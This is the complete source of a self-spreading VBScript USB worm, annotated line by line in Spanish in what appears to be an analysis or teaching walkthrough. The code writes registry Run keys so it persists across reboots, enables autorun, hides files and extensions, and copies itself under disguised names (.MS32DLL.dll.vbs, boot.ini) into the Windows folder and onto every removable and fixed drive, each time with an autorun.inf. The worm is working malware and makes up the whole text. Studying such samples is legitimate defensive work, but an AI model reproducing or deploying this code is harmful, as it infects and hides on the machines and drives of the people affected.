'ker'slow and silent (sas)1.0 on error resume next'Por si sale algun error dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,cc,hm'Declara algunas variables atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe .MS32DLL.dll.vbs"'Guarda en atr, lo que será el autorun de la memoria extraibleset fs = createobject("Scripting.FileSystemObject")set mf = fs.getfile(Wscript.ScriptFullname)'Declara un objecto y obtiene la ruta del script en ejecuciónset rg = createobject("WScript.Shell")'Declara otro objecto para trabajar con otros elementos del sistema rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout","0"rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL",winpath&"\.MS32DLL.dll.vbs"rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot","wscript.exe "&winpath&"\boot.ini"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun",0,"REG_DWORD"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden",1,"REG_DWORD"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt","1"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden","1"'Escribe ciertas entradas en el registro para asegurarse su ejecucion, estar oculto, etc dim text,sizesize = mf.size'Obtiene el tamaño del script set text=mf.openastextstream(1,-2)'Abre el script en modo lectura cc = text.readline'Le una linea del codigo y lo guardado while not text.atendofstream'Cuando no sea el final del archivomysource=mysource&text.readlinemysource=mysource & vbcrlf'Guarda cada linea y le agrega un salto, esta regenerando el archivoloop'Toda esta pequeña funcion podria haberse sustituido por un simple readall XD Set winpath = fs.getspecialfolder(0)'Obtiene la ruta de la carpeta Windows, esto lo hace dos veces ya que esta un par de lineas mas abajoset tf = fs.getfile(winpath & "\.MS32DLL.dll.vbs")tf.attributes = 32'Obtiene el archivo y le da atributos de archivo simple set tf=fs.createtextfile(winpath & "\.MS32DLL.dll.vbs",2,true)tf.write "'ker"&vbcrlf&mysourcetf.close'Sobreescribe el propio archivo con el source que habia guardado antes'En lugar de write se podria haber utilizado writeline si se hubiese usuado readall como correspondia :p set tf = fs.getfile(winpath & "\.MS32DLL.dll.vbs")tf.attributes = 39'Cambia los atributos a archivo oculto, de sistema y solo lecturaSet winpath = fs.getspecialfolder(0)set tf = fs.getfile(winpath & "\boot.ini")tf.attributes = 32'Ahora obtiene el archivo boot.ini en la carpeta windows y al igual que antes, cambia sus atributos set tf=fs.createtextfile(winpath & "\boot.ini",2,true)tf.write "'ker"&vbcrlf&mysourcetf.close'Una vez más, sobreescribe el archivo con el source que habia guardado antes set tf = fs.getfile(winpath & "\boot.ini")tf.attributes = 39'Y vuelve a cambiar sus atributos a rchivo oculto, de sistema y solo lectura if cc = "'mark" thenrg.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullnameend if'Si la primera linea de codigo es mark, entonces ejecuta el script if cc = "'marker" thenrg.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullnameend if'Si la primera linea de codigo es marker, entonces muestra el script'Aunque parezca mentira, para eso son las opciones del explorer.exe dofor each flashdrive in fs.drives'Por cada unidad de disco hm="'mark" If (flashdrive.drivetype=1 or flashdrive.drivetype=2) and flashdrive.path <> "A:" thenif(flashdrive.drivetype=2) thenhm = "'marker"end if'Si es removible, distinta a A: y esta ok... Fixed set tf=fs.getfile(flashdrive.path &"\.MS32DLL.dll.vbs")tf.attributes =32set tf=fs.createtextfile(flashdrive.path &"\.MS32DLL.dll.vbs",2,true)tf.write hm&vbcrlf&mysourcetf.closeset tf=fs.getfile(flashdrive.path &"\.MS32DLL.dll.vbs")tf.attributes =39set tf =fs.getfile(flashdrive.path &"\autorun.inf")tf.attributes = 32set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)tf.write atrtf.closeset tf =fs.getfile(flashdrive.path &"\autorun.inf")tf.attributes=39end if'Obtiene la ruta del disco, escribe el virus y el autorun.inf y les cambia los atributos rg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout","0"rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL",winpath&"\.MS32DLL.dll.vbs"rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\winboot","wscript.exe /E:vbs "&winpath&"\boot.ini"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun",0,"REG_DWORD"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SuperHidden",1,"REG_DWORD"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden",0,"REG_DWORD"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt","1"rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden","1"'Vuelve a escribir las mismas llaves en el registro, las del principio next if cc <> "'mark" thenWscript.sleep 10000end if'Si cc es distinto de mark, entonces hace una pausa de 10 segundos loop while cc <> "'mark"'Sigue con el loop mientras cc sea distinto a mark 